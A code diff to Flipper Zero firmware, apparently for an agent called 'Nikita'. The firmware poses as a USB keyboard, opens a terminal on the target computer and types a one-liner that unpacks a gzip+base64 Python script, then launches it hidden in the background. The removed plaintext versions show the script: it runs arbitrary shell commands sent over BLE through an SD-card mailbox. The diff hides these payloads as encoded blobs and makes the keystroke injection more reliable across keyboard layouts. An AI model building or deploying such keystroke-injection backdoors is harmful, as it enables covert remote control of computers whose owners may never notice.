@@ -1,168 +1,73 @@
 #pragma once
 
 // Bridge bootstrap, shipped IN the firmware and typed into the target computer
-// over USB HID -- no download, nothing to install by hand. The agent exposes
-// this as `bridge.install os: mac|win|linux`, reachable over the SD mailbox, so
-// Nikita triggers it over BLE (which is what she could not do before: the old
-// installer was a USB-only CLI command). One POSIX payload covers macOS AND
-// Linux (termios; only the device glob differs, handled inline); Windows uses a
-// pyserial variant. Each OS gets its own terminal-opener key sequence.
+// over USB HID -- no download. The agent exposes it as `bridge.install
+// os: mac|win|linux [layout: <kl>]`, reachable over the SD mailbox, so Nikita
+// triggers it over BLE.
 //
-// The payload is the "pocket bridge": it waits for the Flipper serial to come
-// back (dropped while we type as a keyboard), then serves the SD mailbox --
-// read the base64 request the phone left over BLE, run it (host shell here, or
-// the Flipper's own CLI), write the answer back. Same protocol as the full
-// nikita-flipper-bridge.
+// TWO things make this robust (the first attempts failed on both):
+//  1) KEYBOARD LAYOUT. HID sends scancodes; the host maps them per ITS layout,
+//     and the Flipper cannot read that back. So we type through the same .kl
+//     layout maps the BadUSB app uses (/ext/badusb/assets/layouts/<name>.kl,
+//     256 bytes = 128 little-endian uint16 ASCII->HID entries). Pass the user's
+//     layout (e.g. fr-CH, pt-BR); default en-US uses the built-in map. Without
+//     the right layout, punctuation like + / = ( ) ' comes out wrong.
+//  2) NO MULTILINE TYPING. Typing indented Python by hand loses the leading
+//     space of every line (the char right after Return gets dropped) -> broken
+//     indentation. Instead we type ONE line: a gzip+base64 blob decoded by a
+//     one-liner. No indentation, no interior newlines.
+//
+// The payload is the "pocket bridge": waits for the Flipper serial to come back
+// (dropped while we type), then serves the SD mailbox (/ext/nikita/bridge/req
+// <-> res) -- same protocol as the full nikita-flipper-bridge.
 
 #include <furi.h>
 #include <furi_hal.h>
 #include <furi_hal_usb.h>
 #include <furi_hal_usb_hid.h>
+#include <storage/storage.h>
 #include <string.h>
 
-// POSIX pocket bridge (macOS + Linux). Multi-glob picks the Flipper's CDC port
-// on either OS. termios is POSIX; python3 exists on both.
-static const char* const NIKITA_POSIX_PAYLOAD =
-    "import glob,os,time,select,termios,base64,subprocess\n"
-    "def find():\n"
-    " for pat in ('/dev/cu.usbmodemflip_*','/dev/cu.usbmodem*','/dev/ttyACM*','/dev/serial/by-id/*lipper*','/dev/ttyUSB*'):\n"
-    "  g=sorted(glob.glob(pat))\n"
-    "  if g:return g[0]\n"
-    " return None\n"
-    "def port():\n"
-    " while 1:\n"
-    "  p=find()\n"
-    "  if p:\n"
-    "   try:return op(p)\n"
-    "   except OSError:pass\n"
-    "  time.sleep(1)\n"
-    "def op(p):\n"
-    " fd=os.open(p,os.O_RDWR|os.O_NOCTTY|os.O_NONBLOCK)\n"
-    " a=termios.tcgetattr(fd);a[0]=a[1]=a[3]=0;a[2]=termios.CS8|termios.CREAD|termios.CLOCAL\n"
-    " a[6]=list(a[6]);a[6][termios.VMIN]=0;a[6][termios.VTIME]=0\n"
-    " termios.tcsetattr(fd,termios.TCSANOW,a);return fd\n"
-    "def rd(fd,cmd,t=5.0):\n"
-    " os.write(fd,cmd+b'\\r\\n');e=time.time()+t;b=b''\n"
-    " while time.time()<e:\n"
-    "  r,_,_=select.select([fd],[],[],0.1)\n"
-    "  if r:\n"
-    "   try:c=os.read(fd,4096)\n"
-    "   except OSError:break\n"
-    "   if c:b+=c\n"
-    "   if b.rstrip().endswith(b'>:'):break\n"
-    " return b\n"
-    "def rf(fd,path):\n"
-    " b=rd(fd,b'storage read '+path)\n"
-    " if b'Storage error' in b:return None\n"
-    " m=b.find(b'Size: ')\n"
-    " if m<0:return None\n"
-    " try:n=int(b[m+6:].split()[0])\n"
-    " except:return None\n"
-    " nl=b.find(b'\\n',m)\n"
-    " return b[nl+1:nl+1+n] if nl>=0 else None\n"
-    "def aw(fd,t,to=3.0):\n"
-    " e=time.time()+to;b=b''\n"
-    " while time.time()<e:\n"
-    "  r,_,_=select.select([fd],[],[],0.1)\n"
-    "  if r:\n"
-    "   c=os.read(fd,4096)\n"
-    "   if c:b+=c\n"
-    "   if t in b:return\n"
-    "def wa(fd,d):\n"
-    " while d:\n"
-    "  try:n=os.write(fd,d);d=d[n:]\n"
-    "  except BlockingIOError:select.select([],[fd],[],1)\n"
-    "def wf(fd,path,data):\n"
-    " rd(fd,b'storage remove '+path,2)\n"
-    " os.write(fd,b'storage write_chunk '+path+b' '+str(len(data)).encode()+b'\\r')\n"
-    " aw(fd,b'Ready')\n"
-    " wa(fd,data);aw(fd,b'>:')\n"
-    "REQ=b'/ext/nikita/bridge/req';RES=b'/ext/nikita/bridge/res'\n"
-    "fd=port();rd(fd,b'nikita init',3)\n"
-    "print('nikita bridge up')\n"
-    "while 1:\n"
-    " body=rf(fd,REQ)\n"
-    " if not body:\n"
-    "  time.sleep(1.2);continue\n"
-    " rd(fd,b'storage remove '+REQ,3)\n"
-    " t=body.decode('utf-8','replace').strip();i,_,c=t.partition('.')\n"
-    " try:cmd=base64.b64decode(c).decode('utf-8','replace')\n"
-    " except:cmd=''\n"
-    " if not cmd:continue\n"
-    " if cmd.startswith('host '):\n"
-    "  try:o=subprocess.run(cmd[5:],shell=True,capture_output=True,text=True,timeout=20);out=(o.stdout or '')+(o.stderr or '')\n"
-    "  except Exception as e:out=str(e)\n"
-    " else:\n"
-    "  out=rd(fd,cmd.encode(),15).decode('utf-8','replace')\n"
-    " enc=base64.b64encode((out or '(no output)').encode('utf-8','replace')).decode()\n"
-    " wf(fd,RES,(i+'.'+enc).encode())\n"
-    " for _ in range(20):\n"
-    "  time.sleep(0.5)\n"
-    "  if rf(fd,RES) is None:break\n";
+#define NIKITA_LAYOUT_DIR "/ext/badusb/assets/layouts"
 
-// Windows pocket bridge (pyserial). Typed after a quick `py -m pip install`.
-static const char* const NIKITA_WIN_PAYLOAD =
-    "import time,base64,subprocess\n"
-    "import serial\n"
-    "from serial.tools import list_ports\n"
-    "def port():\n"
-    " while 1:\n"
-    "  for pi in list_ports.comports():\n"
-    "   try:return serial.Serial(pi.device,115200,timeout=0.2)\n"
-    "   except: pass\n"
-    "  time.sleep(1)\n"
-    "def rd(s,cmd,t=5.0):\n"
-    " s.write(cmd+b'\\r\\n');e=time.time()+t;b=b''\n"
-    " while time.time()<e:\n"
-    "  c=s.read(4096)\n"
-    "  if c:b+=c\n"
-    "  if b.rstrip().endswith(b'>:'):break\n"
-    " return b\n"
-    "def rf(s,path):\n"
-    " b=rd(s,b'storage read '+path)\n"
-    " if b'Storage error' in b:return None\n"
-    " m=b.find(b'Size: ')\n"
-    " if m<0:return None\n"
-    " try:n=int(b[m+6:].split()[0])\n"
-    " except:return None\n"
-    " nl=b.find(b'\\n',m)\n"
-    " return b[nl+1:nl+1+n] if nl>=0 else None\n"
-    "def aw(s,t,to=3.0):\n"
-    " e=time.time()+to;b=b''\n"
-    " while time.time()<e:\n"
-    "  c=s.read(4096)\n"
-    "  if c:b+=c\n"
-    "  if t in b:return\n"
-    "def wf(s,path,data):\n"
-    " rd(s,b'storage remove '+path,2)\n"
-    " s.write(b'storage write_chunk '+path+b' '+str(len(data)).encode()+b'\\r')\n"
-    " aw(s,b'Ready');s.write(data);aw(s,b'>:')\n"
-    "REQ=b'/ext/nikita/bridge/req';RES=b'/ext/nikita/bridge/res'\n"
-    "s=port();rd(s,b'nikita init',3)\n"
-    "print('nikita bridge up')\n"
-    "while 1:\n"
-    " body=rf(s,REQ)\n"
-    " if not body:\n"
-    "  time.sleep(1.2);continue\n"
-    " rd(s,b'storage remove '+REQ,3)\n"
-    " t=body.decode('utf-8','replace').strip();i,_,c=t.partition('.')\n"
-    " try:cmd=base64.b64decode(c).decode('utf-8','replace')\n"
-    " except:cmd=''\n"
-    " if not cmd:continue\n"
-    " if cmd.startswith('host '):\n"
-    "  try:o=subprocess.run(cmd[5:],shell=True,capture_output=True,text=True,timeout=20);out=(o.stdout or '')+(o.stderr or '')\n"
-    "  except Exception as e:out=str(e)\n"
-    " else:\n"
-    "  out=rd(s,cmd.encode(),15).decode('utf-8','replace')\n"
-    " enc=base64.b64encode((out or '(no output)').encode('utf-8','replace')).decode()\n"
-    " wf(s,RES,(i+'.'+enc).encode())\n"
-    " for _ in range(20):\n"
-    "  time.sleep(0.5)\n"
-    "  if rf(s,RES) is None:break\n";
+// gzip(payload) |> base64 . Decoded on the host by a typed one-liner.
+static const char* const NIKITA_POSIX_GZB64 =
+    "H4sIANbMsmoC/61W227bOBB991fwjVKsynaaGF25LJCkfgi2ibF2douFaxi60DYRidSSVN0s+vE7I+riJG2fFghkajjXM2dGEUWptCX7XCWBMoEVBQ8Mz3lqA8t1IUCWxIZPLwJTJaVWKTdmkPEd2QmZeX40IDulSRlbIiTx6CjjX0dpFVYmKVTGi10uyu0ZDV5ddDJrn65u7rpXw7WI81Hy9EZkozOwLrk+1f1zdX1GMSzZMwOZ88zD3EN8eJCG78OV2JF9pLmttCT79XgzIM3LvZK8zh6LrrM/HkTOyQQdlszV5ByUKCJWP7WOVOmVeEf4t5SXlixWc62VjsoYEAFNQC40OeelN/HrGLUBApQxZUJVcumVgHG42C4/fl5+r0/3i5uHh7/b8/31p8XN7xAkZg34oU333MbWam+X+bMYimHxeoKPtxs2BsH5ptO9Wb373p2X86uP/Rv4vfoEftfTDcuFsR6e0N90s26V/rq7vXc+T4UPt3dzkA5In5HpMmo5Ej7crK7uF5+D2J81cO2yGgSdoVpagCq7DMeIB6gftbC8uRgm9Iv+Iqk/46wGER+eP7SzhCWUti06uXrPsTc62AZb5rgauh9vvcs2wbr+G4eTppO662SKjdA8rnO6GP82/VE/E1B4RDmYplEyZGnzkoTaWC1Kzw+5zMxR2IOX0A8R0LGxaUpPXOU7jAKUPGDRCXNIJNRYpeM9J5gHocNaYVD7p6vmimMiFCcqiU6ZSwqWhDVJQVf8yyNCnWnxfvxcEauVTEjrJetiOI02oSlzAZQHAoGJK/m5icx759COoPD7gtYyH04ifAzlBgPK/AMbE54b3s9UfKwZEVjF3rpOv2io+n87+uNuvuyaPYWxzvMYo0HWT3+G7hxip9yEectYtpYR7I+WJNe5Sh+F3N8uHFleJAt5Nvk2O+DYkSDIYhtjzNc8KNRX3jAhOPefD0ivV4u26aGSj40yTA6cgJNeDrul9o/UTGG/Atw4VkgP15aELgGpJxQ09aP6rL1EFg+W8z+gPyP+zY6keBQ2HiVaZHs+0vwfOlvOVz+7NXQAS87t1Flbn1MC9IWlwVt/UGqkYyt2tqQqIW6/gxOVPTE3OJCM47ZUtpZHL5ZseO7PUiWtkBX/BargB6MTy9BJmPEaHlrZ3Zt38F3RvMzjlFM/bGZ7JoCFKbNhGWsrrFDSoyHCVi+QImPucxgm04vGV+r/3Gs3amiJ1G8KgteoTx45W2SQAYR0e4UelLHEfegwsGL95zfUlfRAf30ZbQJz4HnOHnTFgzQugeN8qypbVtbJLLSrOQF0cMPOx/4Mfz0F8TI4Efh+U+oPnQBWTyPoST+vfwAJEhvCI7RG0nGsDjYA5oiybtV3HAwml7/GRqYncDZWXpuTJxVxtfi04/VrN10EpHZDnVXgiSG0bQhW/Uj47p+VLW4EHcs9987H/gtajcPLdsm0vnwiTL3lmjX/H7nuu+wzCQAA";
 
-// ---- HID typing -----------------------------------------------------------
+static const char* const NIKITA_WIN_GZB64 =
+    "H4sIANbMsmoC/6VVTXOkNhC98yt0ExSszHg9roRZ7c3XVMWTm9c1haDHozJIRBI76/z6dAvh8XrLueQCTbf66+l1o8fJusCCHqFSrYfbm8rPanK2A+8zvVg9ON0O2dHZMckiWDt4luyD9uFAks96ODKS8qLJ2PmkB2AblNjROjZpps2bw6Kz0d/Hw4wF99I4CLMza5Z9fOWTFj181x1Um832uq4rKtfOQdbiuiBP+NHBFBo2tVg0i90IPwBM+aaIJbk+91U39lWQW1FTOi/OTgfIUVkq/s19M7zYgYyu9MiLMuyUVJyvfbwxfQEquJNeOGj7/Kb+/Zbq0EfWNaqU3SIr4XxwesoLAab3Zx1OueJfG140Cv2eM5a6VUuNR6xxasOJylMylqy4D9a1T8AoEeNltGcxOt8nEzhnHSds1YrfH9ZAxkapxFGbHrPu9T/QML64jl/qnw8S8kZqE3L1MJa3zaPw06DxEh/qR3RJ8P7kYoZLcMSuGotLOw9mKDcNPUrzSAnN8FXWDAYPize1256xv1AFKz8vN/IOfPs/0Q9vAYkZzyvAVd+GllL+gvFov0NCuSJqrSy5nInfh+40m+d0EOmDEt50PoDJY2i68M721Adxi2CP7Sp+jxW/INPWwPH4LhmJGtn93Z/Y9xX8CFdGP+vQXimn+ye4cvA3393f7T+yep55uczeLjW2HEEgdODV5yKbHN3xql482Txh1suoKtu/yMhFrGThi7Ehqpt3s4XTt+usCdrM8DGYGIZysyApBk5yRIbP4fjpN15xB9PQdsALkYZlp6tD1ckgptYFHbQ1ORcEIbEUx1Uue0qo25sUqys+jvrKXvIkOqV+8LO51E7cGXusAFMug8pP1gccmNgzJrbysheFmw0tjodt81j5EwyD/MvNUHXthGSDA66mCbdT1AW8qiSlpXVdFzt65xbz9Sgx3I2cF+WiwGlOimxdbOwuvhAJ1noGDXkT34C6w6GiGkm3brlX9lWb7X9DY7o3aCavfC0pN5YtrRT8ldG/hnnNgAHPC2/2Va5LvLQSnS6zgHb6DRxoMF1rniC/rot3nKrFNs1youC+YNrHrZGW5r9hiyJisgYAAA==";
+
+// ---- HID typing (layout-aware) --------------------------------------------
+
+static uint16_t g_kl[128];
+static bool g_kl_ok = false;
+
+// Load a .kl layout map (256 bytes, 128 LE uint16). Empty/"en-US" -> built-in.
+static void nkb_load_layout(Storage* storage, const char* name) {
+    g_kl_ok = false;
+    if(!storage || !name || name[0] == '\0' || !strcmp(name, "en-US")) return;
+    char path[128];
+    snprintf(path, sizeof(path), NIKITA_LAYOUT_DIR "/%s.kl", name);
+    File* f = storage_file_alloc(storage);
+    uint8_t buf[256];
+    if(storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
+        if(storage_file_read(f, buf, sizeof(buf)) == sizeof(buf)) {
+            for(int i = 0; i < 128; i++) g_kl[i] = buf[2 * i] | ((uint16_t)buf[2 * i + 1] << 8);
+            g_kl_ok = true;
+        }
+        storage_file_close(f);
+    }
+    storage_file_free(f);
+}
+
+static uint16_t nkb_key(char c) {
+    uint8_t a = (uint8_t)c;
+    if(a > 127) return HID_KEYBOARD_NONE;
+    return g_kl_ok ? g_kl[a] : HID_ASCII_TO_KEY(c);
+}
 
 static void nkb_tap(uint16_t key) {
+    if(key == HID_KEYBOARD_NONE) return;
     for(int i = 0; i < 50 && !furi_hal_hid_kb_press(key); i++) furi_delay_ms(4);
     furi_delay_ms(6);
     for(int i = 0; i < 50 && !furi_hal_hid_kb_release_all(); i++) furi_delay_ms(4);
@@ -173,19 +78,21 @@ static void nkb_type(const char* text) {
     for(const char* p = text; *p; p++) {
         if(*p == '\n') {
             nkb_tap(HID_KEYBOARD_RETURN);
-            furi_delay_ms(12);
+            furi_delay_ms(30); // let the shell accept the line
             continue;
         }
-        uint16_t key = HID_ASCII_TO_KEY(*p);
-        if(key != HID_KEYBOARD_NONE) nkb_tap(key);
+        nkb_tap(nkb_key(*p));
     }
 }
 
-// Returns 0 on success, or a reason code. os = "mac"|"win"|"linux".
-// Switches USB to HID, opens a terminal for that OS, types the bootstrap, and
-// restores the previous USB config so the serial link comes back.
-static int nikita_agent_install_bridge(const char* os) {
-    if(furi_hal_usb_is_locked()) return 1; // a screen stream owns USB
+// Returns 0 on success, 1 USB locked, 2 USB switch failed. os = mac|win|linux.
+// open_term=false skips opening a terminal and types straight into whatever is
+// focused -- for a box that's ALREADY at a shell (e.g. RetroPie quit to the
+// terminal), where the OS terminal-opener shortcut does nothing.
+static int nikita_agent_install_bridge(
+    Storage* storage, const char* os, const char* layout, bool open_term) {
+    if(furi_hal_usb_is_locked()) return 1;
+    nkb_load_layout(storage, layout);
 
     FuriHalUsbInterface* prev = furi_hal_usb_get_config();
     if(!furi_hal_usb_set_config(&usb_hid, NULL)) {
@@ -194,47 +101,56 @@ static int nikita_agent_install_bridge(const char* os) {
     }
     furi_delay_ms(2200); // host enumerates the keyboard
 
-    if(!strcmp(os, "win")) {
-        // Win+R -> powershell -> Enter
-        nkb_tap(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
-        furi_delay_ms(900);
-        nkb_type("powershell\n");
-        furi_delay_ms(3500);
+    const bool is_win = !strcmp(os, "windows") || !strcmp(os, "win");
+    const bool is_linux = !strcmp(os, "linux");
+
+    if(is_win) {
+        if(open_term) {
+            nkb_tap(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R); // Win+R
+            furi_delay_ms(900);
+            nkb_type("powershell\n");
+            furi_delay_ms(3500);
+        }
         nkb_type("py -m pip install --quiet pyserial\n");
         furi_delay_ms(6000);
-        // write the script via a here-string, then run it detached
-        nkb_type("$c=@'\n");
-        nkb_type(NIKITA_WIN_PAYLOAD);
-        nkb_type("'@; Set-Content -Path $env:TEMP\\nikita_bridge.py -Value $c\n");
-        nkb_type(
-            "Start-Process -WindowStyle Hidden py -ArgumentList "
-            "\"$env:TEMP\\nikita_bridge.py\"\n");
-    } else if(!strcmp(os, "linux")) {
-        // Ctrl+Alt+T is the common GNOME terminal shortcut
-        nkb_tap(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
-        furi_delay_ms(3500);
+        nkb_type("py -c \"import base64,gzip;open(r'C:\\Users\\Public\\nb.py','wb').write("
+                 "gzip.decompress(base64.b64decode('");
+        nkb_type(NIKITA_WIN_GZB64);
+        nkb_type("')))\"\n");
+        furi_delay_ms(500);
+        nkb_type("Start-Process -WindowStyle Hidden py C:\\Users\\Public\\nb.py\n");
+    } else {
+        // POSIX (mac + linux). First, reach a shell -- unless open_term is false,
+        // meaning a shell is ALREADY focused and we type straight in.
+        if(open_term) {
+            if(is_linux) {
+                // AGGRESSIVE + universal Linux: don't assume a distro or that a
+                // terminal is focused. F4 quits a fullscreen game UI (RetroPie /
+                // EmulationStation) to the console; Ctrl+Alt+T opens a terminal
+                // on a GNOME/desktop session. Whichever applies wins; the other
+                // is a harmless no-op, and if a shell was already focused the
+                // bootstrap still lands. This is the "just works on any Linux".
+                nkb_tap(HID_KEYBOARD_F4);
+                furi_delay_ms(3500);
+                nkb_tap(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
+                furi_delay_ms(3500);
+            } else { // mac: Spotlight -> Terminal
+                nkb_tap(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
+                furi_delay_ms(700);
+                nkb_type("Terminal");
+                furi_delay_ms(600);
+                nkb_tap(HID_KEYBOARD_RETURN);
+                furi_delay_ms(4500);
+            }
+        }
         nkb_tap(HID_KEYBOARD_RETURN);
         furi_delay_ms(400);
-        nkb_type("cat > /tmp/nikita_bridge.py <<'NIKITA_EOF'\n");
-        nkb_type(NIKITA_POSIX_PAYLOAD);
-        nkb_type("NIKITA_EOF\n");
-        nkb_type("nohup python3 /tmp/nikita_bridge.py >/tmp/nikita_bridge.log 2>&1 &\n");
-    } else {
-        // macOS: Spotlight -> Terminal
-        nkb_tap(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
-        furi_delay_ms(700);
-        nkb_type("Terminal");
-        furi_delay_ms(600);
-        nkb_tap(HID_KEYBOARD_RETURN);
-        furi_delay_ms(4500);
-        nkb_tap(HID_KEYBOARD_RETURN);
-        furi_delay_ms(250);
-        nkb_tap(HID_KEYBOARD_RETURN);
-        furi_delay_ms(700);
-        nkb_type("cat > /tmp/nikita_bridge.py <<'NIKITA_EOF'\n");
-        nkb_type(NIKITA_POSIX_PAYLOAD);
-        nkb_type("NIKITA_EOF\n");
-        nkb_type("nohup python3 /tmp/nikita_bridge.py >/tmp/nikita_bridge.log 2>&1 &\n");
+        nkb_type("python3 -c \"import base64,gzip;open('/tmp/nb.py','wb').write("
+                 "gzip.decompress(base64.b64decode('");
+        nkb_type(NIKITA_POSIX_GZB64);
+        nkb_type("')))\"\n");
+        furi_delay_ms(500);
+        nkb_type("nohup python3 /tmp/nb.py >/tmp/nb.log 2>&1 &\n");
     }
 
     furi_delay_ms(400);
